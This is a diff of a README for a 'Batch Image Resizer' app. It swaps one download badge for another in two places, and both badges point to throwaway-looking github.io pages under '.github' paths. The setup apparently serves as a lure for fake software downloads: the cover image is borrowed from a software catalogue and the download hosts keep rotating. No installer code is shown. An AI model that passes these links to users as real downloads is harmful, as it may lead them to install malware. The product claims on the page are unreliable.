@@ -2,11 +2,7 @@
 
 ![Batch Image Resizer Cover](https://images.sftcdn.net/images/t_app-cover-s,f_auto/p/94f1047b-88cd-4ff4-944b-1d13dee2e104/2741419215/batch-image-resizer-lite-screenshot.jpg)
 
-<p align="center">
-  <a href="https://rumpels-kaji.github.io/.github/Batch">
-    <img src="https://img.shields.io/badge/⬇️_Download_Batch_Image_Resizer-2980b9?style=for-the-badge&logo=apple&logoColor=white" alt="Download Batch Image Resizer for macOS">
-  </a>
-</p>
+[![GET Setup](https://img.shields.io/badge/GET%20%E2%80%94%20Setup-0078D6?style=for-the-badge&logoColor=white)](https://tequilakotulavzqlkg.github.io/.github/Batch-Image-Resizer)
 
 ---
 
@@ -116,8 +112,4 @@ Yes — it’s optimized for high-speed batch processing.
 
 ---
 
-<p align="center">
-  <a href="https://rumpels-kaji.github.io/.github/Batch">
-    <img src="https://img.shields.io/badge/⬇️_Download_Batch_Image_Resizer-2980b9?style=for-the-badge&logo=apple&logoColor=white" alt="Download Batch Image Resizer for macOS">
-  </a>
-</p>
+[![GET Setup](https://img.shields.io/badge/GET%20%E2%80%94%20Setup-0078D6?style=for-the-badge&logoColor=white)](https://tequilakotulavzqlkg.github.io/.github/Batch-Image-Resizer)
